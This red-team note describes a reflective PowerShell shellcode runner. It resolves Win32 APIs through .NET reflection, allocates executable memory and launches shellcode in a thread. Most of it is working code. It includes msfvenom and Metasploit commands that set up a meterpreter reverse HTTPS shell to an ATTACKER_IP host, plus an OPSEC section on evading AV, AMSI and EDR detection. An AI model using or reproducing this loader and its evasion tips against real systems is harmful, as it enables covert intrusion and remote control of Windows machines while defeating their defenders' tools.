---
title: Reflective PowerShell
draft: false
tags:
  - red-teaming
  - windows
  - powershell
  - evasion
  - post-exploitation
---

**Reflective PowerShell** allows executing Win32 APIs (`VirtualAlloc`, `CreateThread`, `WriteProcessMemory`) entirely in memory, without writing C# code to disk or invoking a compiler. We use .NET Reflection to locate pre-loaded assemblies, resolve Win32 function pointers, and create delegate types at runtime — producing a fully in-memory shellcode runner in pure PowerShell.

This is critical for OPSEC: `Add-Type` invokes the Visual C# compiler and writes both source and compiled assembly to a temp directory where AV can scan them. Reflection avoids this entirely.

---

When we run PowerShell code with `Add-Type`, the Visual C# Command-Line Compiler handles the compilation process and writes both the C# source code and the compiled C# assembly temporarily to disk. **This leaves artifacts on the hard drive that antivirus programs can identify**.

We will leverage the [Reflection](https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/concepts/reflection) technique. This is a very powerful feature that allows us to dynamically obtain references to objects that are otherwise private or internal.

> [!Important]
> Code executes entirely on memory.

# 1. Dynamically locating Win32 APIs (leveraging UnsafeNativeMethods)

Our goal with this technique is to create the .NET assembly in memory instead of writing code and compiling it.

To perform a dynamic lookup of function addresses, the operating system provides two special Win32 APIs: 
- [GetModuleHandle](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea): obtains a handle to the specified DLL in the form of the DLL's memory address.
- [GetProcAddress](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress): to find the address of a specific function, we'll pass the DLL handle and the function name to _GetProcAddress_, which will return the function address.

We have to call these functions without creating any assembly. To do so, we use this code to search preloaded assemblies (DLLs) in the PowerShell process:
```powershell
$Assemblies = [AppDomain]::CurrentDomain.GetAssemblies()

# list all assemblies:
$Assemblies |
  ForEach-Object {
    $_.GetTypes()|
      ForEach-Object {
          $_ | Get-Member -Static| Where-Object {
            $_.TypeName.Contains('Unsafe')
          }
      } 2> $null
    }
    
    
# list all assemblies that have the exact methods we are looking for:
$Assemblies |
    ForEach-Object {
        $_.GetTypes() |
        ForEach-Object {
            $_ | Get-Member -Static |
            Where-Object {
                $_.TypeName.Contains('Unsafe') -and
                $_.Name -eq 'GetProcAddress' -or
                $_.Name -eq 'GetModuleHandle'
            }
        }
    } 2> $null
```

> [!Note]
> When C# code needs to directly invoke Win32 APIs, it must use the [Unsafe](https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/keywords/unsafe) keyword. In addition, any functions that are invoked must be declared as static to avoid instantiation. That is why we filter by `Static` and `Unsafe`

We will have to search for "GetModuleHandle" and "GetProcAddress" and we will see for example a Class that uses both functions:
```powershell
...
 TypeName: Microsoft.Win32.UnsafeNativeMethods

Name                             MemberType Definition                                                                                                     
----                             ---------- ----------                                                                                                   
....                                
GetModuleHandle                  Method     static System.IntPtr GetModuleHandle(string modName)                                      ...
GetProcAddress                   Method     static System.IntPtr GetProcAddress(System.IntPtr hModule, string methodName), static 
...
```

To identify which assembly (DLL) contains these two functions, we have to modify the previous code to print the Location and instead of filtering by all the methods with the unsafe keyword we will filter directly for the method we previously identified:
```powershell
$Assemblies = [AppDomain]::CurrentDomain.GetAssemblies()

$Assemblies |
  ForEach-Object {
    $_.Location
    $_.GetTypes()|
      ForEach-Object {
          $_ | Get-Member -Static| Where-Object {
            $_.TypeName.Equals('Microsoft.Win32.UnsafeNativeMethods')
          }
      } 2> $null
    }
```

This will output the target assembly (DLL):
```powershell
...
C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System\v4.0_4.0.0.0__b77a5c561934e089\**System.dll**
...
GetModuleHandle                  Method     static System.IntPtr GetModuleHandle(string modName) 
GetProcAddress                   Method     static System.IntPtr GetProcAddress(System.IntPtr hModule, st...
```

Next, we will have to obtain a reference to the selected DLL to be able to obtain a reference to the GetModuleHandle and GetProcAddress methods:
```powershell
$systemdll = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { 
  $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') })
  
$unsafeObj = $systemdll.GetType('Microsoft.Win32.UnsafeNativeMethods')

$GetModuleHandle = $unsafeObj.GetMethod('GetModuleHandle')
```

Now we can use this method to get the handle for our desired DLLs (get load address of the DLL):
```powershell
$user32 = $GetModuleHandle.Invoke($null, @("user32.dll"))
```

If we use reflection to get the GetProcAddress we get the `Ambiguous match found` error. This error occurs because there are multiple instances of _GetProcAddress_ within _Microsoft.Win32.UnsafeNativeMethods_. We have obtain all methods in Microsoft.Win32.UnsafeNativeMethods, store them and use the first one to resolve the function address:
```powershell
$user32 = $GetModuleHandle.Invoke($null, @("user32.dll"))
$tmp=@()
$unsafeObj.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
$GetProcAddress = $tmp[0]
$GetProcAddress.Invoke($null, @($user32, "MessageBoxA"))
```

If we execute everything together, we manage to resolve the address of a Win32 API:
```powershell
$systemdll = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { 
  $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') })
$unsafeObj = $systemdll.GetType('Microsoft.Win32.UnsafeNativeMethods')
$GetModuleHandle = $unsafeObj.GetMethod('GetModuleHandle')

$user32 = $GetModuleHandle.Invoke($null, @("user32.dll"))
$tmp=@()
$unsafeObj.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
$GetProcAddress = $tmp[0]
$GetProcAddress.Invoke($null, @($user32, "MessageBoxA"))
```

> [!Note]
> The address received by Invoke is in decimal.

We can rewrite all of this into a function to reuse it:
```powershell
function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

# usage
PS C:\> LookupFunc "kernel32.dll" "CreateFileA"
```

# 2. Dynamically defining Win32 API arguments

Now that we can resolve addresses of Win32 APIs, we must define the argument types.

We must pair the number of arguments and their associated data types with the resolved function memory address. We can do this in C# with the [GetDelegateForFunctionPointer](https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.getdelegateforfunctionpointer?view=netframework-4.8) method. This method takes two arguments, including the memory address of the function, and the function prototype represented as a type.

In C#, a function prototype is known as a [Delegate](https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/delegates/) or _delegate type_. Here's a declaration creating the delegate type for _MessageBox_:

```
int delegate MessageBoxSig(IntPtr hWnd, String text, String caption, int options);
```

> [!Note]
> Its like an interface for the functions. We must define an interface for the function we want to execute and pair it with the function address we resolved in step 1.

Unfortunately, there is no equivalent to the _delegate_ keyword in PowerShell, so we have to follow the steps below to create a delegate type:
```powershell
# 1. Lookup for the function address:
function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

$MessageBoxA = LookupFunc user32.dll MessageBoxA

# 2. Pair the number of arguments and their associated data types with the resolved function memory address:

# create a new assembly object:
$MyAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate') 

# assign the new assembly execution permissions so its not saved in disk:
$Domain = [AppDomain]::CurrentDomain
$MyAssemblyBuilder = $Domain.DefineDynamicAssembly($MyAssembly, 
  [System.Reflection.Emit.AssemblyBuilderAccess]::Run)

# create a module inside the assembly
$MyModuleBuilder = $MyAssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)

# define a delegate type called "MyDelegateType" with attributes and the type it builds on top of:
$MyTypeBuilder = $MyModuleBuilder.DefineType('MyDelegateType', 
  'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

# put the function prototype inside the type and let it become our custom delegate type:
# define the constructor specifying:
# 1. the attributes of the constructor -> public referenced by both name or signature)
# 2. calling convention for the constructor (standard)
# 3. parameter types of the constructor (same parameters as the function we want to execute)
$MyConstructorBuilder = $MyTypeBuilder.DefineConstructor(
  'RTSpecialName, HideBySig, Public', 
    [System.Reflection.CallingConventions]::Standard, 
      @([IntPtr], [String], [String], [int]))
      
# set implementation flags (used at runtime and its managed code):  
$MyConstructorBuilder.SetImplementationFlags('Runtime, Managed')

# define the Invoke method to be able to specify the delegate type:
# 1. Name of the method to define (Invoke)
# 2. Method attributes (public to make it accessible, allow it to be called by both name and signature,...)
# 3. Return type of the function
# 4. Parameter types of the function we want to execute
$MyMethodBuilder = $MyTypeBuilder.DefineMethod('Invoke', 
  'Public, HideBySig, NewSlot, Virtual', 
    [int], 
      @([IntPtr], [String], [String], [int]))

# set the implementation flags to enable calling the Invoke method:
$MyMethodBuilder.SetImplementationFlags('Runtime, Managed')

# instantiate the delegate type:
$MyDelegateType = $MyTypeBuilder.CreateType()

# link the function address with the Delegate Type (interface definition):
$MyFunction = [System.Runtime.InteropServices.Marshal]::
    GetDelegateForFunctionPointer($MessageBoxA, $MyDelegateType)

# call the function inside memory
$MyFunction.Invoke([IntPtr]::Zero,"Hello World","This is My MessageBox",0)
```

> [!Note]
> We just need to change the function we want to execute in the LookupFunc, the corresponding argument types when defining the Delegate Type and the method, and the function call specifying the correct parameters

# 3. Invoking Win32 APIs in memory - Shellcode

Simplified function code for getting the delegate type:
```powershell
function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}
```

0. Setup a listener:
```bash
msf> use multi/handler
msf> use multi/handler
msf> set payload windows/x64/meterpreter/reverse_https
msf> set LHOST ATTACKER_IP
msf> set LPORT 443
msf> set EXITFUNC thread
msf> run
```

1. Call VirtualAlloc to allocate a memory buffer:
```powershell
$VirtualAllocAddr = LookupFunc kernel32.dll VirtualAlloc
$VirtualAllocDelegateType = getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegateType)
$VirtualAlloc.Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

# one liner
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
```

2. Generate the payload in ps1 format:
```bash
$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LOCAL_IP LPORT=LOCAL_PORT EXITFUNC=thread -f ps1
```

3. Copy the payload inside the allocated buffer:
```powershell
[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0...

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
```

4. Execute the shellcode and wait for the execution to finish:
```powershell
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int32]))).Invoke($hThread, 0xFFFFFFFF)
```

---
# Full Payload

> [!Note]
> Copy the `LookupFunc` and `getDelegateType` functions before executing the payload.

```bash
msf> use multi/handler
msf> use multi/handler
msf> set payload windows/x64/meterpreter/reverse_https
msf> set LHOST ATTACKER_IP
msf> set LPORT 443
msf> set EXITFUNC thread
```

Functions:
```powershell
function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}
```

```powershell
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0...

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int32]))).Invoke($hThread, 0xFFFFFFFF)
```

---
# OPSEC

> [!Warning] OPSEC
> - **`LookupFunc` pattern** (searching `Microsoft.Win32.UnsafeNativeMethods` for `GetProcAddress`) is a known detection signature — some AV/EDR products flag it. Consider obfuscating the class name search string.
> - **AMSI**: PowerShell 5+ has AMSI (Antimalware Scan Interface) that scans scripts before execution. This technique does not bypass AMSI on its own — an AMSI bypass must be run first in the same session. See [[AV Evasion]].
> - **RWX allocation**: `VirtualAlloc` with `0x40` (PAGE_EXECUTE_READWRITE) is flagged by EDR heuristics. Use `0x04` (PAGE_READWRITE) first, copy the shellcode, then change to `0x20` (PAGE_EXECUTE_READ) with `VirtualProtect` before executing.
> - **`CreateThread` vs in-process execution**: calling `CreateThread` in the current PowerShell process means the thread is visible to any tool inspecting the process's thread list. Consider using `QueueUserAPC` or other execution primitives.
> - **Staged payload OPSEC**: the generated `ps1` shellcode (`-f ps1`) contains the full stager as a byte array — it will be scanned by AMSI. Use an encrypted or encoded shellcode stub to evade in-memory detection.

---
# Related Notes
- [[Phishing with Jscript]] — alternative in-memory shellcode runner via JScript + DotNetToJScript
- [[Process Injection and Migration]] — injecting shellcode into remote processes after initial execution
- [[AV Evasion]] — AMSI bypass, obfuscation, and EDR evasion techniques
- [[Command and Control (C2-C&C)]] — C2 operations after obtaining a Meterpreter/Empire session
- [[Visual Studio Setup for Development & Compilation]] — for compiled alternatives (C# shellcode runners)
